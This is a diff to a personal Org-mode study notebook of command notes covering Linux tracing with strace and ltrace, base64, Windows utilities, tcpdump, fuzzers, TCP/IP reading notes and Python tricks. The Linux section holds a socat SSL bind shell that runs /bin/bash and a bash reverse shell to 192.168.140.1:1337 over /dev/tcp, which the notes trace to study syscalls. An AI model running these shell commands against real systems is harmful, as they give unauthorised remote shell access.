@@ -345,13 +345,14 @@
       - ~cat bind_shell.key bind_shell.crt > bind_shell.pem~
       - ~sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash,stderr,pty,setsid,sigint,sane~ //bind_shell, can be connected with nc --ssl option
 
-*** TODO linux syscalls
-    + ~strace -f~ //follow child processes created, syscall: fork
-      - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~
-
 *** base64 encoding decoding
     + ~echo -n 'cat' | base64 -w 0~ //echo without trailing \n, base64 encoding without auto wrapping
     + ~echo -n 'Y2F0' | base64 -d~ //decode, -i ignore garbage for more tolerance
+
+*** TODO system call tracing, libcall tracing // man syscall
+    + ~strace~
+      - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ // -f: trace child processes created, as a result of the fork(2), vfork(2), and clone(2) system calls (quote: man strace). grep -n 192.168.140.1 strace.out, check syscalls around the line
+    + ~ltrace -f ls~ // -f: same with strace -f.
 
 ** TODO bash scripting
    + man bash
@@ -367,7 +368,6 @@
    + ~assoc~ //e.g. assoc .txt
    + ~ipconfig~ // /flushdns, /rebase, /renew
    + ~powercfg~ // /A list all available sleep states; /hibernate on | off; /energy 
-
    + ~shutdown~ // /h for hiberanate; /r /o restart to advanced start-up 
    + ~sfc /SCANNOW~ //Windows Resource Checker
 
@@ -511,6 +511,9 @@
 **** tcpdump capture //maybe verbose
      + ~sudo tcpdump -X -s0 port 80~ //s0 raise the single package-size limit to >256kb.
      + ~sudo tcpdump -i eth0 -n -s0 -vX port 80~ //verbose
+
+*** Fuzzer
+    + AFL, libFuzzer, honggfuzz, KAFL(kernel), syscall fuzzer, syzkaller
 
 * Book4_Chapter 01 An Introduction to TCP/IP
   
@@ -862,10 +865,8 @@ relay the datagram.
 *** Proxy ARP p102
 
 
-* S2 python utilities
-
+* S2 python#utilities
 ** char, string processing
-
 *** encoding and decoding in python
    [[ut#EncodeDecodeAFile.py]]
    + ~str("こ").encode("utf-8")~ //<class 'bytes'> b'\xe3\x81\x93' 
@@ -914,3 +915,40 @@ relay the datagram.
       two_bytes_big = an_int.to_bytes(2,'big') # b'\x00\x05'
       two_bytes_little = an_int.to_bytes(2,'little') # b'\x05\x00'
       #+end_src
+
+* S2 python#scripting
+** basic
+    + ~python -m module argv[]~
+    + ~dir(); help()~
+      #+begin_src
+      import json
+      dir(json); help(dir); help(json);
+      #+end_src
+
+*** pipenv
+    + ~pipenv shell~
+    + ~pip -V~ //the version & path of the pip, which reveals the env path.
+    + ~exit~
+    + ~pipenv run python~
+
+** tricks
+  + ~list(range(1,3))~ //[1, 2]
+  + ~a, *b, _ = (1, 2, 3, 4)~ // *b = [2, 3]
+  + ~setattr(obj, key, value); getattr(obj, key); hasattr(obj, key); delattr(obj, key)~
+    #+begin_src
+    class C:
+        a = 0
+    
+    c = C()
+    k = 'k1'
+    setattr(c, k, 'v'); # c.k1 === 'v'
+    kn = '1' # attribute name must be string
+    setattr(c, kn, 3); # //! c.1, start with number, invalid syntax
+    getattr(c, '1'); # ok
+    #+end_src
+  + ~for k,v in dict.items()~
+    #+begin_src
+    d = {'k1': 1, 'k2': 2, 'k3': 3}
+    for k,v in d.items():
+        print(k, v)
+    #+end_src
